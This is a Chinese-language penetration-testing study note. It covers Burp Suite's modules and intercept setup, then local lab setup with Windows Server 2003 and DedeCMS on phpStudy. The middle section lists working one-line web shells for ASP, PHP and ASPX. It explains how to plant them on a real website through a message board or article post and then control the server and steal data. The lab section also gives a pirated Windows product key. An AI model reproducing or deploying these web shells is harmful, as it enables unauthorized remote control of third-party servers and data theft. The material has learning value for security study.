#burpsuite 的配置和使用
##主要模块
    1. Target(目标)——显示目标目录结构的的一个功能 
    2. Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 
    3. Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 
    4. Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。 
    5. Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 
    6. Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。 
    7. Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。 
    8. Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。 
    9. Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。
    10. Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。 
    11. Options(设置)——对Burp Suite的一些设置
    12. Alerts(警告)——Burp Suite在运行过程中发生的一写错误


##环境配置
BurpSuite是用java开发的，所以要想使用这个工具、需先安装JDK

> 设置浏览器代理

选择手动配置代理LAN或HTTP（火狐）：127.0.0.1 
端口 8080

##BurpSuite抓包
> 基本步骤

打开BurpSuite，Proxy->Options,确认代理配置正确
打开 intercept 确认intercept is on
在网页上输入，提交。此时intercept->Raw页上会显示post请求
ctrl+r或者右键send to repeater
打开Repeater->Raw，点击GO，右侧点击Render即可修改



#一句话木马
一句话木马短小精悍，能够远程控制，盗取数据
> 常见一句话木马

asp一句话木马：
　　	
	<%execute(request("value"))%>
php一句话木马：
　　	
	<?php @eval($_POST[value]);?>
aspx一句话木马：
　	
	<%@ Page Language="Jscript"%>
　	<%eval(Request.Item["value"])%>

>使用方法

 首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.
然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。

#Windows 2003 server的虚拟机安装和本地环境的搭建
> 镜像地址

	ed2k://|file|cn_win_srv_2003_r2_enterprise_x64_with_sp2_vl_cd1_X13-47314.iso|647686144|107F10D2A7FF12FFF0602FF60602BB37|/ 
> 序列号

	windows 2003 R2 Sp2 64位 企业版
	MR78C-GF2CY-KC864-DTG74-VMT73

> 使用phpstudy搭建本地环境

1.安装phpstudy，记住www文件夹（这是网站源码的存放路径）
2.在网页搜索DedeCMS下载网站源码，下载织梦dedecms，压缩包为tar.gz文件
3.解压文件，将原来www文件夹内的所有文件删除，将解压后uploads内的所有文件复制进去
4.确认phpstudy处于工作状态
5.在浏览器中输入
	http://localhost/ 
  打开网页安装界面
6.填上数据库密码
7.完成后登录后台（验证码必须用英文输入法）
8.然后即可对网站进行编辑

